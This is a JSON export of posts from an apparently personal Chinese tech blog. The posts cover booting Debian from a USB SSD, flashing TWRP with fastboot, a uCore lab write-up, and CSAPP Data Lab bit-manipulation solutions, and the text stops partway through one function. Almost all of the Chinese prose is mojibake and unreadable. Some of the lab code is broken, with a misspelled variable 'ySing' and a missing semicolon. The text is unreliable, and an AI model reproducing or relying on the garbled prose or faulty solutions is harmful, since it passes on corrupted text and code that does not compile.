[{"content":"å‰æ‰‹å‰ä¼  è¿‘æ¥æ»¡è„‘å­éƒ½æ˜¯å°†Linuxè£…åœ¨å„ç§åœ°æ–¹è¿™ä»¶äº‹æƒ…ã€‚æŠ˜è…¾å®Œmobile linuxååˆæŠ˜è…¾openstickï¼Œæœ€åå´å‘ç°å®åœ¨é¸¡è‚‹â€”â€”ä¾¿æºæ€§åˆæ ¼ä½†ç®—åŠ›ä¸è¶³ã€‚é‚è½¬å¿µæƒ³èµ·åˆšåˆšè´­ä¹°çš„å›ºæ€Uç›˜ï¼Œå…¶æ€§èƒ½å®Œå…¨æ»¡è¶³äº†åšç³»ç»Ÿç›˜çš„è¦æ±‚ï¼Œè£…ä¸ªLinuxéšèº«æºå¸¦å²‚ä¸ç¾å“‰ï¼Ÿä½†ç¢äºæ‰‹ä¸Šè¿™ä¸ªæ¢µæƒ³F395ç”¨æ–™ä¸ä½³ï¼Œè¿˜å­˜å‚¨äº†å¿…è¦çš„æ•°æ®ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—ä¸‹è¡€æœ¬å¦è¡Œè´­ä¹°ä¸€ä¸ªæŒ‡æ ‡æ›´ä¼˜çš„å›ºæ€Uç›˜ã€‚æ€æ¥æƒ³å»è¿˜æ˜¯å¿ç—›ä¸‹å•äº†ä¸€ç›´ä»¥æ¥å¿ƒå¿ƒå¿µå¿µçš„CHIPFANCIER SE D\nä»·æ ¼è¾ƒé«˜ä½†ç”¨æ–™é¡¶å°–ï¼Œè¿˜ç»ˆèº«ä¿å›ºã€‚ä½¿ç”¨MLCçš„é¢—ç²’ï¼Œå¯¿å‘½å’Œé€Ÿåº¦éƒ½å¾—åˆ°äº†ä¿è¯ã€‚\nè‡ªä¿¡è£…ç›˜ è¿™å‡ å¹´å·²ç»æ•°ä¸æ¸…è£…è¿‡å¤šå°‘æ¬¡ç³»ç»Ÿäº†ã€‚äºæ˜¯é£å¿«åœ°å†æ¬¡é‡å¤äº†ä¸€éæ—¢æœ‰è·¯å¾„â€”â€”åªä¸è¿‡è¿™æ¬¡æ˜¯å°†å®‰è£…ä½ç½®é€‰æ‹©ä¸ºå›ºæ€Uç›˜ç½¢äº†ã€‚\nOKï¼Œé‡å¯è®¡ç®—æœºâ€¦â€¦ç›´æ¥è¿›å…¥æ–°çš„Debianä¸­ã€‚æ­¤æ—¶ä¹Ÿä¸å¿˜æ£€æŸ¥ä¸€ä¸‹åˆ†åŒºå†…å®¹çš„æ­£ç¡®æ€§ï¼š\n1 2 3 4 root@debian ~# df -h Filesystem Size Used Avail Use% Mounted on /dev/sda2 / /dev/nvme0n1p2\t/boot/efi æˆ‘æœºæ•åœ°æ„è¯†åˆ°äº†äº‹æƒ…çš„ä¸å¯¹åŠ²ï¼šæ­¤æ¬¡å¯åŠ¨æ‰€ç”¨çš„å¼•å¯¼åˆ†åŒºä½äºnvmeç¡¬ç›˜ä¸Šï¼Œä¹Ÿå°±æ˜¯å¦ä¸€å—Windowsç³»ç»Ÿç›˜çš„å¼•å¯¼åˆ†åŒºã€‚\nä¸ç¡®ä¿¡çš„ç»“è®ºï¼šéƒ¨åˆ†å‘è¡Œç‰ˆåœ¨å®‰è£…æ—¶ï¼Œè‹¥å‘ç°ç£ç›˜ï¼ˆå³ä½¿æ˜¯ä¸åŒçš„ç‰©ç†ç£ç›˜ï¼‰ä¸Šå·²æœ‰EFIåˆ†åŒºï¼Œåˆ™ä¸ä¼šé‡æ–°åˆ›å»ºEFIåˆ†åŒºï¼Œè€Œæ˜¯å°†å¼•å¯¼æ–‡ä»¶å®‰è£…åœ¨å·²æœ‰EFIåˆ†åŒºä¸­\nè¿™ä¸ªå¥½è§£å†³ï¼Œé‡è£…ä¸€ä¸‹ç³»ç»Ÿï¼Œåœ¨é…ç½®åˆ†åŒºæ—¶ï¼Œæ‰‹åŠ¨æŒ‡å®šå¯¹åº”åˆ†åŒºå³å¯è§£å†³ã€‚\nå¥½äº†ï¼å†æ¬¡å¯åŠ¨ï¼\nï¼Ÿï¼Ÿæ€ä¹ˆåˆè¿›Windowsäº†ï¼Ÿæˆ‘æ‰‹åŠ¨æŒ‡å®šçš„å¯åŠ¨è®¾å¤‡ä¸ºå›ºæ€Uç›˜å‘€ï¼Ÿ\nå¥‡æ€ªçš„æ•…éšœå°±è¦ç”¨éå¸¸æ‰‹æ®µâ€”â€”æˆ‘ç›´æ¥æ‹†æ‰çš„å­˜æ”¾Windowsçš„NVMeç¡¬ç›˜ï¼Œå†æ¬¡å¯åŠ¨ï¼\nâ€”â€” å±å¹•ä¹Œæ¼†å˜›é»‘ï¼ŒHPçš„BIOSç»™æˆ‘æŠ¥äº†ä¸€ä¸ª3F0çš„é”™è¯¯ï¼šBoot Device Not Found\nè‡³æ­¤æˆ‘å¯¹è‡ªå·±å¯¹æ³¢ç”µè„‘åŸè€æ¿çš„ä¿¡å¿ƒå—åˆ°é‡æŒ«â€”â€”ç®€ç®€å•å•çš„Uç›˜ç³»ç»Ÿæˆ‘éƒ½åšä¸å¥½å˜›ğŸ˜°\nå›æƒ³èµ·åˆšè£…å¥½çš„ç¬¬ä¸€æ¬¡é‡å¯ï¼Œæ˜¯æˆåŠŸè¿›å…¥äº†Uç›˜ä¸­çš„Debiançš„ã€‚è¯´æ˜æ ¹æ–‡ä»¶ç³»ç»Ÿæ²¡æœ‰é—®é¢˜ã€‚é‚£åº”è¯¥å°±æ˜¯EFIåˆ†åŒºä¸­çš„é—®é¢˜äº†ã€‚\nå°è¯•åœ¨BIOSä¸­æ‰‹åŠ¨é€‰æ‹©äº†å¼•å¯¼æ–‡ä»¶ä¸ºEFI/debian/grubx64.efiï¼Œæœç„¶å¯åŠ¨æˆåŠŸäº†ã€‚\né‚ç ´æ¡ˆï¼š\nBIOSç¨‹åºåœ¨EFIåˆ†åŒºä¸­å¯»æ‰¾efiå¼•å¯¼æ–‡ä»¶æ—¶ï¼Œä¹Ÿæ˜¯æ‰‹æŒä¸€ä¸ªè·¯å¾„å­—å…¸æ¥å¯»æ‰¾çš„ã€‚åƒå¤§ç‰Œçš„Windowsçš„å¼•å¯¼æ–‡ä»¶åœ¨EFIåˆ†åŒºä¸­çš„è·¯å¾„EFI/Microsoft/Boot/bootmgfw.efiï¼Œè‚¯å®šæ˜¯è¢«å„å®¶å‚å•†çš„BIOSç¨‹åºå‘˜é‡ç‚¹å…³ç…§çš„ï¼Œå„ç§BIOSéƒ½ä¼šæ¥æœç´¢è¿™ä¸€è·¯å¾„ã€‚ä½†åŒºåŒºDebian+grubï¼Œå ‚å ‚å•†ä¸šå…¬å¸è°ä¼šæ¥ç®¡ä½ ï¼Ÿæ‰€ä»¥æˆ‘è¿™å°HPçš„BIOSæ ¹æœ¬å°±æ²¡æ¥EFI/debian/grubx64.efiçœ‹ä¸€çœ¼ï¼Œå°±å‘æˆ‘æŠ¥å‘Šï¼šæ²¡æœ‰å¯å¯åŠ¨çš„åˆ†åŒºï¼Œè¯·å®‰è£…æ“ä½œç³»ç»Ÿã€‚\nçŸ¥é“äº†åŸå› ï¼Œè§£å†³é—®é¢˜å°±ä¸éš¾äº†ï¼Œé˜…æ¯•ï¼šhttps://askubuntu.com/questions/244261/how-do-i-get-my-hp-laptop-to-boot-into-grub-from-my-new-efi-file\nå¯çŸ¥ï¼Œcp /boot/efi/EFI/debian/grubx64.efi /boot/efi/EFI/boot/bootx64.efiå³å¯è§£å†³ã€‚\nè™šæ‹Ÿç¯å¢ƒå¯åŠ¨ è¯è¯´æˆ‘æŠ˜è…¾è¿™äº›æ˜¯æƒ³è§£å†³ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ\nå…¬å¸çš„å†…ç½‘ç¯å¢ƒåªèƒ½ç”±åŸŸæ§ä¸‹çš„Windowsæˆ–MacOSæ¥å…¥ï¼Œä½†æ—¥å¸¸çš„å¼€å‘å·¥ä½œå´åˆå…¨éƒ½åœ¨Linuxä¸Šï¼ŒåŒæ—¶åˆä¸æƒ³ä½¿ç”¨è™šæ‹Ÿç£ç›˜ï¼Œæˆ–æ˜¯å°†å…¬å¸ç”µè„‘å¸¦å»å¸¦æ¥ã€‚é‚£ä¹ˆå°±åªèƒ½æ˜¯åœ¨Windows hostä¸‹ä½¿ç”¨ç¬¬ä¸€ç±»hypervisorå¯åŠ¨æˆ‘å®‰è£…åœ¨å›ºæ€Uç›˜å†…çš„Linuxç³»ç»Ÿäº†ã€‚\nè¿™é‡Œè¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ç›®å‰vmware workstationå·²ç»å¯ä»¥å’ŒMicrosoft hyper-vå…±å­˜ã€‚ä½†åœ¨å¼€å¯äº†hyper-vçš„Windowsä¸Šï¼Œvmware workstationæ˜¯æ— æ³•åšåˆ°CPUç›´é€šçš„ï¼Œå› ä¸º Intel-VT/AMD-Vå·²è¢«hyper-vå æ®ã€‚hyper-vä½œä¸ºç¬¬äºŒç±»hypervisorï¼Œå®é™…ä¸Šä¼šå°†Windowsæœ¬èº«ä¹Ÿè¿›è¡Œè™šæ‹ŸåŒ–ï¼Œé€ æˆæ€§èƒ½æŠ˜æŸã€‚æ‰€ä»¥æˆ‘ä¸€èˆ¬éƒ½æ˜¯ç›´æ¥åœç”¨hyper-vï¼Œä»£ä»·åˆ™æ˜¯WSLç”±æ­¤å°±ä¸å¯ç”¨äº†ã€‚\næˆ‘ä»¬ä½¿ç”¨ç®¡ç†å‘˜æƒé™å¯åŠ¨vmware workstationï¼ˆå¦åˆ™ä¼šå¯¼è‡´æ²¡æœ‰ç›´æ¥è®¿é—®ç£ç›˜ç¡¬ä»¶çš„æƒé™ï¼‰ï¼Œæ–°å»ºè™šæ‹Ÿæœºæ—¶ï¼Œé€‰æ‹©ä½¿ç”¨ç‰©ç†ç£ç›˜è€Œéè™šæ‹Ÿç£ç›˜ï¼š\nå›ºä»¶ç±»å‹é€‰æ‹©UEFIï¼š\nåŒæ—¶åšå¦‚ä¸‹é€‰æ‹©é¿å…å¿«ç…§ï¼š\nå³å¯æˆåŠŸå¯åŠ¨ï¼š\n","date":"2022-09-13T15:45:25+08:00","image":"https://s2.loli.net/2022/09/13/kjqmNCfOILzuZgn.jpg","permalink":"https://cerr.cc/post/%E4%B8%80%E6%AC%A1u%E7%9B%98%E7%B3%BB%E7%BB%9F%E7%9B%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%AE%B0/","title":"ä¸€æ¬¡Uç›˜ç³»ç»Ÿç›˜çš„æŠ˜è…¾è®°"},{"content":"å‚è€ƒhttps://www.jianshu.com/p/d960a6f517d8\nFastboot ä¸€ä¸ªé€šä¿¡åè®®ï¼Œç”¨äºç›´æ¥å‘å®‰å“æ‰‹æœºFlashçš„ä¸åŒåˆ†åŒºä¸­å†™å…¥æ•°æ®ã€‚\nhttps://android.googlesource.com/platform/system/core/+/refs/heads/master/fastboot/\nä¸€èˆ¬åœ¨bootloaderä¸­æä¾›fastbootã€‚è¿æ¥ç”µè„‘åå¯ä»¥æ‰§è¡Œfastbootå‘½ä»¤ã€‚\nRecovery ä¸€ä¸ªå•ç‹¬çš„åˆ†åŒºï¼Œå†…å¯åŒ…å«ä¸€ä¸ªæ¢å¤ç”¨çš„è¿·ä½ ç³»ç»Ÿï¼Œå¦‚TWRPã€‚å¯ä»¥ä½¿ç”¨adbã€‚\nTWRP å®˜ç½‘ï¼šhttps://twrp.me/\näºå…¶ä¸­ä¸‹è½½åˆ°å¯¹åº”æ‰‹æœºå‹å·æ‰€ç”¨TWRPé•œåƒåï¼Œä»¥USBè°ƒè¯•æ¨¡å¼è¿æ¥åˆ°æ‰‹æœºã€‚\nä½¿ç”¨adbé‡å¯æ‰‹æœºåˆ°fastbootï¼š\n1 adb reboot bootloader åˆ·å…¥twrpé•œåƒï¼š\n1 fastboot flash recovery twrp.img é‡å¯æ‰‹æœºï¼š\n1 fastboot reboot recovery ç›®å‰è®¸å¤šROMä¼šåœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶é‡å†™recoveryåˆ†åŒºå¯¼è‡´TWRPè¢«å®˜æ–¹recoveryç¨‹åºè¦†ç›–ã€‚æ‰€ä»¥æˆ‘ä»¬è¦ç›´æ¥é‡å¯è¿›å…¥Recoveryï¼š\nNote many devices will replace your custom recovery automatically during first boot. To prevent this, use Google to find the proper key combo to enter recovery. After typing fastboot reboot, hold the key combo and boot to TWRP. Once TWRP is booted, TWRP will patch the stock ROM to prevent the stock ROM from replacing TWRP. If you don\u0026rsquo;t follow this step, you will have to repeat the install.\nå®‰å“è®¾å¤‡åˆ†åŒº https://source.android.com/devices/bootloader/partitions\n","date":"2022-09-05T16:56:14+08:00","image":"https://s2.loli.net/2022/09/13/u6ESQwpdvaU2igk.png","permalink":"https://cerr.cc/post/android%E6%90%9E%E6%9C%BA%E7%AC%94%E8%AE%B0/","title":"Androidææœºç¬”è®°"},{"content":"","date":"2022-09-05T14:09:16+08:00","permalink":"https://cerr.cc/post/afl%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","title":"AFLæºç åˆ†æ"},{"content":" ç¬¬ä¸€æ¬¡åšuCoreå®éªŒè¿˜æ˜¯åœ¨å¤§ä¸‰æœ«å‚åŠ é¾™èŠ¯æ¯æ—¶ã€‚ç¢äºå½“æ—¶æ°´å¹³ä¸è¶³ï¼Œå®éªŒåšçš„æµ…å°è¾„æ­¢ã€è‰è‰äº†äº‹ï¼Œä¼¼ä¹æ›´å¤šçš„æ˜¯ä¸ºäº†æ»¡è¶³è€ƒæ ¸æŒ‡æ ‡ã€‚ä½•å†µå½“æ—¶è¿˜æ˜¯å‘å‹‡è€å¸ˆåšæŒ‡å¯¼æ•™å¸ˆï¼Œæƒ³æ¥å®åœ¨å¿ƒæ€€æ„§ç–šã€‚ä»Šæ—¥é‡åšuCore Labsï¼Œä¸ºè‡ªå·±è¿˜ä¸€è¿˜å½“æ—¶æ¬ ä¸‹çš„è´¦ã€‚\nLab0 çŸ¥è¯†ç¯å¢ƒå‡†å¤‡ uCoreæ˜¯ä¸€å¥—å®Œæ•´çš„æ“ä½œç³»ç»Ÿå†…æ ¸æ•™ç¨‹ï¼Œé…å¥—åŒ…å«äº†æ•™å­¦è§†é¢‘ã€å®éªŒæŒ‡å¯¼ä¹¦ã€uCoreå†…æ ¸æºç ä»¥åŠå®éªŒä»£ç ã€‚å‡ºå‘ç‚¹å¦‚ä¸‹ï¼š\nhttps://chyyuu.gitbooks.io/ucore_os_docs/content/\nLab0çš„å†…å®¹ä¸ºå‰ç½®çŸ¥è¯†ä¸ç¯å¢ƒé…ç½®\næˆ‘ä»¬æ¥åˆ°Labçš„gitä»“åº“ï¼šhttps://github.com/chyyuu/os_kernel_lab/tree/master\næ³¨æ„ä»¥ä¸Šå®éªŒä¹¦é…å¥—çš„ä»“åº“åˆ†æ”¯ä¸ºmasterè€Œémainï¼š\ngithubå·²å°†é»˜è®¤åˆ†æ”¯åç”±masteræ›´å˜ä¸ºmain mainåˆ†æ”¯ä¸ºåæ¥æ›´æ–°çš„rCoreï¼Œè€Œ2020å¹´å‰çš„uCoreä¾¿ä¿ç•™åœ¨äº†masteråˆ†æ”¯ä¸­ å°†å®éªŒä»£ç cloneè‡³æœ¬åœ°å¹¶åˆ‡æ¢åˆ†æ”¯ï¼šï¼ˆæˆ–è€…ä¸ºæ–¹ä¾¿ä¿ç•™ä½œä¸šï¼Œå¯ä»¥forkä¸€ä»½ï¼‰\n1 2 3 git clone https://github.com/chyyuu/os_kernel_lab.git cd os_kernel_lab git switch master å…¶ä½™çš„å‰å¤‡çŸ¥è¯†äºæ­¤ä¸å†èµ˜è¿°\nLab1 ç³»ç»Ÿè½¯ä»¶å¯åŠ¨ ä¼ é€é—¨ï¼šhttps://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_1_goals.html\nç»ƒä¹ 1 ç†è§£é€šè¿‡makeç”Ÿæˆæ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ ä¼ é€é—¨ï¼šhttps://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_2_1_1_ex1.html\nå­¦ä¹ è®°å½•ï¼šhttps://cerr.cc/post/zkvçš„cc-æ„å»ºç³»ç»Ÿå­¦ä¹ ä¹‹è·¯/\ngnu makeå®˜æ–¹æ–‡æ¡£ï¼šhttps://www.gnu.org/software/make/manual/html_node/index.html\næ“ä½œç³»ç»Ÿé•œåƒæ–‡ä»¶ucore.imgæ˜¯å¦‚ä½•ä¸€æ­¥ä¸€æ­¥ç”Ÿæˆçš„ï¼Ÿ gnu makeçš„ä¸€é¡µç‰ˆASCIIæ–‡æ¡£ï¼Œæ–¹ä¾¿Ctrl + Fé€ŸæŸ¥ï¼šhttps://www.gnu.org/software/make/manual/make.txt\nLab1 Makefile æ¶‰åŠåˆ°çš„makeå…³é”®è¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026#39;.SUFFIXES\u0026#39; The prerequisites of the special target \u0026#39;.SUFFIXES\u0026#39; are the list of suffixes to be used in checking for suffix rules. *Note Old-Fashioned Suffix Rules: Suffix Rules. \u0026#39;.DELETE_ON_ERROR\u0026#39; If \u0026#39;.DELETE_ON_ERROR\u0026#39; is mentioned as a target anywhere in the makefile, then \u0026#39;make\u0026#39; will delete the target of a rule if it has changed and its recipe exits with a nonzero exit status, just as it does when it receives a signal. *Note Errors in Recipes: Errors. æ³¨é‡Šåçš„ Lab1 Makefile å¦‚ä¸‹ ä¸€ä¸ªè¢«ç³»ç»Ÿè®¤ä¸ºæ˜¯ç¬¦åˆè§„èŒƒçš„ç¡¬ç›˜ä¸»å¼•å¯¼æ‰‡åŒºçš„ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ Lab2 ç‰©ç†å†…å­˜ç®¡ç† Lab3 è™šæ‹Ÿå†…å­˜ç®¡ç† Lab4 å†…æ ¸çº¿ç¨‹ç®¡ç† Lab5 ç”¨æˆ·è¿›ç¨‹ç®¡ç† Lab6 è°ƒåº¦å™¨ Lab7 åŒæ­¥äº’æ–¥ Lab8 æ–‡ä»¶ç³»ç»Ÿ ","date":"2022-08-31T10:38:51+08:00","image":"https://s2.loli.net/2022/08/31/1oK4x5BTMAQhy9O.png","permalink":"https://cerr.cc/post/ucore-lab-writeup/","title":"uCore Lab WriteUp"},{"content":"0x0 å®éªŒæºï¼šhttp://csapp.cs.cmu.edu/3e/labs.html\nç›´æ¥ç‚¹å‡»å®éªŒåè§†ä½œä»¥æ•™å¸ˆèº«ä»½ä¸‹è½½æ•™å­¦èµ„æºã€‚é¢˜ç›®æ–‡ä»¶åº”äºSelf-Study Handoutä¸‹è½½\nåŸä¹¦pdfï¼šhttps://github.com/Sorosliu1029/CSAPP-Labs/raw/master/Computer%20Systems%20A%20Programmers%20Perspective%20(3rd).pdf\nData Lab ä¸‹è½½è§£å‹é¢˜ç›®æ–‡ä»¶ï¼š\n1 2 wget http://csapp.cs.cmu.edu/3e/datalab-handout.tar tar xvf datalab-handout.tar é¢˜ç›®è¯´æ˜ï¼š\nhttp://csapp.cs.cmu.edu/3e/README-datalab\næˆ‘ä»¬çš„ä»»åŠ¡æ˜¯åœ¨å—é™ä½¿ç”¨è¿ç®—ç¬¦ä¸æ§åˆ¶æµçš„å‰æä¸‹ï¼Œå®ç°bit.cä¸­çš„æ¯ä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚\nå®ç°å¼‚æˆ–è¿ç®— å¼‚æˆ–ï¼Œå³ â€œä¸åŒæ—¶ä¸º0â€ ä¸” â€œä¸åŒæ—¶ä¸º1â€\n^ï¼Œå³ ~(~x\u0026amp;~y) ä¸” ~(x\u0026amp;y)\n1 2 3 4 5 6 7 8 9 10 11 //1 /* * bitXor - x^y using only ~ and \u0026amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026amp; * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~x\u0026amp;~y)\u0026amp;~(x\u0026amp;y); } æ±‚32ä½ä¸‹æœ€å°çš„è¡¥ç æ•°å€¼ è¡¥ç ï¼ŒäºŒè¡¥æ•°ï¼Œ2\u0026rsquo;s complementï¼Œå‚è§ï¼š\nhttps://zh.wikipedia.org/zh-cn/%E4%BA%8C%E8%A3%9C%E6%95%B8\n32ä½ä¸‹ï¼Œæœ€å°çš„è¡¥ç æ•°å€¼ä¸º1000000000000000000000000000000\nè¡¥ç 10000000ä¸ºä»€ä¹ˆå¯ä»¥è¡¨ç¤º-128ï¼Ÿè€Œé0ã€128ï¼Ÿå‚è§ï¼š\nhttps://www.zhihu.com/question/28685048\n1 2 3 4 5 6 7 8 9 /* * tmin - return minimum two\u0026#39;s complement integer * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1 \u0026lt;\u0026lt; 31; } åˆ¤æ–­è¾“å…¥æ˜¯å¦æ˜¯è¡¥ç ä¸­çš„æœ€å¤§æ•´æ•° 32ä½ä¸‹ï¼Œè¡¥ç ä¸­çš„æœ€å¤§æ•´æ•°æ˜¯0x7fffffffï¼Œæ¥ä¸‹æ¥çœç•¥ä¸€äº›ï¼Œåªå†™8bitsï¼Œä¸‹æ–‡åŒç†ã€‚\næ ¸å¿ƒæ‰‹æ®µæ˜¯é€ å‡º00000000ï¼Œåˆ©ç”¨0ä¸é0å€¼è¿”å›trueä¸falseï¼š\nè‹¥ x = 0111111\nx + 1 + x = 11111111\n~(x + 1 + x) = 00000000 = 0\nä½†åŒæ—¶éœ€è¦æ’é™¤ x = 11111111 çš„æƒ…å†µï¼Œå› ä¸ºæ­¤æ—¶ x + 1 + x æº¢å‡ºåä¹Ÿå¾—åˆ° 11111111\næ•…å€ŸåŠ©ï¼š\nx = 11111111 æ—¶ x + !(x + 1) = 0\nx = 01111111 æ—¶ x + !(x + 1) = 01111111 = !0\næ¥æ’é™¤ï¼š\n1 2 3 4 5 6 7 8 9 10 /* * isTmax - returns 1 if x is the maximum, two\u0026#39;s complement number, * and 0 otherwise * Legal ops: ! ~ \u0026amp; ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { return !(~(x + 1 + x)) \u0026amp; (x + !(x + 1)); } åˆ¤æ–­æ‰€æœ‰å¥‡æ•°ä½æ˜¯å¦éƒ½ä¸º1 ä½çš„ç¼–å·ä»0ï¼ˆæœ€ä½æœ‰æ•ˆï¼‰åˆ°31ï¼ˆæœ€é«˜æœ‰æ•ˆï¼‰\né‡‡ç”¨æ©ç ï¼Œå³å½“ x | 0x55555555 == 0xffffffff æ—¶åˆ™è¿”å›1\n0x55 == 0b 0101 0101\n1 2 3 4 5 6 7 8 9 10 11 12 /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { int a = (0x55 \u0026lt;\u0026lt; 0) | (0x55 \u0026lt;\u0026lt; 8) | (0x55 \u0026lt;\u0026lt; 16) | (0x55 \u0026lt;\u0026lt; 24); return !~(x | a); } æ±‚ -x æŒ‰ä½å–ååŠ ä¸€å³å¾—è´Ÿæ•°\nè¡¥ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé˜¿è´å°”ç¾¤ï¼Œå¯¹äº xï¼Œ-x æ˜¯å…¶è¡¥ç ï¼Œæ‰€ä»¥ -x å¯ä»¥é€šè¿‡å¯¹ x å–ååŠ 1å¾—åˆ°\n1 2 3 4 5 6 7 8 9 10 /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 5 * Rating: 2 */ int negate(int x) { return ~x + 1; } åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—å­—ç¬¦ASCIIç  ç”¨å‡æ³•ï¼Œåˆ¤æ–­ x-0x30 \u0026gt;= 0 \u0026amp;\u0026amp; 0x39 - x \u0026gt;= 0\nä½†é¢˜å¹²è¦æ±‚ä¸èƒ½ç”¨å‡å·ï¼Œé‚£ä¹ˆå¯ä»¥æ ¹æ®è¡¥ç åŸç†ç”¨åŠ å·å®ç°å‡æ³•\næœ€ååˆ¤æ–­ä¸¤ä¸ªä¸­é—´å€¼çš„ç¬¦å·ä½å…¨ä¸º0å³å¯è¿”å›true\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* * isAsciiDigit - return 1 if 0x30 \u0026lt;= x \u0026lt;= 0x39 (ASCII codes for characters \u0026#39;0\u0026#39; to \u0026#39;9\u0026#39;) * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { int a = x + (~0x30 + 1); // x - 0x30 int b = 0x39 + (~x + 1); // 0x39 - x return !(a \u0026gt;\u0026gt; 31 | b \u0026gt;\u0026gt; 31); } å®ç°Cè¯­è¨€ ? : è¿ç®—ç¬¦ å°†xè½¬åŒ–ä¸º 00000000 æˆ– 11111111 ç”¨äºè®¡ç®—\n1 2 3 4 5 6 7 8 9 10 11 12 /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { x = !!x; x = ~x+1; return (x\u0026amp;y)|(~x\u0026amp;z); } å®ç° \u0026lt;= è¿ç®—ç¬¦ \u0026laquo;å·¦ç§»ä¸€å¾‹è¡¥0ã€‚\u0026raquo;å³ç§»å¯èƒ½è¡¥0ä¹Ÿå¯èƒ½è¡¥ç¬¦å·ä½ï¼Œè§†æœºå™¨è€Œå®šï¼Œé€šå¸¸æ˜¯è¡¥ç¬¦å·ä½ã€‚\né€šè¿‡ä½è¿ç®—å®ç°æ¯”è¾ƒä¸¤ä¸ªæ•°çš„å¤§å°ï¼Œä¸¤ç§æƒ…å†µï¼šä¸€æ˜¯ç¬¦å·ä¸åŒæ­£æ•°ä¸ºå¤§ï¼ŒäºŒæ˜¯ç¬¦å·ç›¸åŒçœ‹å·®å€¼ç¬¦å·\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* * isLessOrEqual - if x \u0026lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { int v = y + (~x+1); int vSignBit = (v \u0026gt;\u0026gt; 31) \u0026amp; 1; int xSign = x \u0026amp; (1\u0026lt;\u0026lt;31); int ySign = y \u0026amp; (1\u0026lt;\u0026lt;31); int signXor = (xSign ^ ySing) \u0026gt;\u0026gt; 31 \u0026amp; 1; return ((!signXor) \u0026amp; (!vSignBit)) | ((signXor) \u0026amp; (xSign\u0026gt;\u0026gt;31)); } å®ç°é€»è¾‘é! 00000000 ï½œ (~00000000 + 1) å¾— 0ï¼Œå…¶ä½™æ•°åšæ­¤è¿ç®—éƒ½å¾—é0ï¼Œä¸”ç¬¦å·ä½ä¸º1\n1 2 3 4 5 6 7 8 9 10 11 /* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { return ((x | (~x + 1)) \u0026gt;\u0026gt; 31) + 1 } æ±‚ä¸€ä¸ªæ•°ç”¨è¡¥ç è¡¨ç¤ºæ‰€éœ€çš„æœ€å°‘ä½æ•° æ­£æ•°åˆ™æŸ¥æ‰¾ä»å·¦è¾¹ç¬¬ä¸€ä¸ª1å¼€å§‹ï¼Œä¸€ç›´åˆ°æœ€å³è¾¹é‚£ä¸€ä½çš„ä½æ•°ï¼Œå†åŠ ä¸Šä¸€ä¸ªç¬¦å·ä½\nè´Ÿæ•°åˆ™æŸ¥æ‰¾ä»å·¦è¾¹ç¬¬ä¸€ä¸ª0å¼€å§‹ï¼Œä¸€ç›´åˆ°æœ€å³è¾¹é‚£ä¸€ä½çš„ä½æ•°ï¼Œå†åŠ ä¸Šä¸€ä¸ªç¬¦å·ä½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* howManyBits - return the minimum number of bits required to represent x in * two\u0026#39;s complement * Examples: howManyBits(12) = 5 0......0 01100 * howManyBits(298) = 10 0.0 0100101010 * howManyBits(-5) = 4 1.......1 1011 * howManyBits(0) = 1 0..........0 0 * howManyBits(-1) = 1 1..........1 1 * howManyBits(0x80000000) = 32 10.........00 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 90 * Rating: 4 */ int howManyBits(int x) { int bit16, bit8, bit4, bit2, bit1; // å¯¹æ“ä½œæ•°å–åï¼Œå°†è´Ÿæ•°è½¬ä¸ºæ­£æ•°ï¼Œæ­£æ•°ä¸å˜ï¼Œä¾¿äºæ›´å¥½çš„è®¡ç®— int sign = x \u0026gt;\u0026gt; 31; x ^= sign; // äºŒåˆ†æŸ¥æ‰¾ï¼Œå…ˆåˆ¤æ–­é«˜16ä½æœ‰æ— 